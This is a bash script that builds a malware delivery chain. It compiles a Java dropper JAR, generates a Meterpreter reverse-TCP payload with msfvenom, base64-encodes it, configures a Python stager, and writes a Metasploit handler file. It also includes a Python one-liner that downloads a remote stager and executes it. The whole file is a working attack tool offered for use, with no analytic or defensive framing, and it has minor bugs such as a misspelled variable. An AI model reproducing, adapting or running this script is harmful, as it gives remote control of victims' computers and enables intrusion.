#!/bin/bash

lhost=""
lport=""
url=""
#hardcoded values
tmp="/tmp/lol"
shellcode="www/shellcode"
dropperin="templates/Dropper.java"
dropperout="bin/Dropper.java"
dropperclass="bin/Dropper.class"
dropper="bin/Dropper.jar"
stagerin="templates/stager.py"
stagerout="www/stager.py"
handlerin="templates/handler.rc"
handlerout="handler.rc"
msf="/opt/metasploit-framework/msfvenom"
payload="python/meterpreter/reverse_tcp"

usage() {
    echo "[>] Usage: $0 -l <lhost> -p <lport> -u <url>"
    exit 1
}

while [ -n "$1" ]; do
    case "$1" in
        -l)
            shift; lhost="$1";;
        -p)
            shift; lport="$1";;
        -u)
            shift; url="$1/shellcode";;
        *)
            echo "[!] Invalid switch"
            usage;;
    esac
    shift
done

[ -z "$lhost" -o -z "$lport" -o -z "$url" ] && usage
run="python -c 'import urllib2; exec( compile( urllib2.urlopen( \"$url/stager.py\" ).read(), \"\", \"exec\" ) )'"

#clear workspace
for i in $tmp $shellcode $stagerout $dropperout $dropperclass $dropper ; do
    rm $i &>/dev/null
done

echo "[>] Building java dropper..."
sed 's%'"__SERVER__"'%'"$url"'%' < $dropperin > $dropperout 
javac -d bin/ $dropperout &>/dev/null
jar cfe $dropper Dropper $dropperclass &>/dev/null
echo "[>] Generating shellcode..."
$msf -p $payload lhost=$lhost lport=$lport -f python -o $shellcode &>/dev/null
echo "[>] Patching..."
echo "exec buf" >> $shellcode
echo "[>] Encoding..."
cat $shellcode | base64 > $tmp && mv $tmp $shellcode && rm $tmp &>/dev/null
echo "[>] Configuring stager..."
sed 's%'"__SERVER__"'%'"$url"'%' < $stagerin > $stagerout
echo "[>] Generating msf rc script"
sed 's%'"__LHOST__"'%'"$lhost"'%' < $handlerin > $handlerout
mv $handerout _
sed 's%'"__SERVER__"'%'"$lport"'%' < _ > $handlerout
echo "[+] Done!!!"
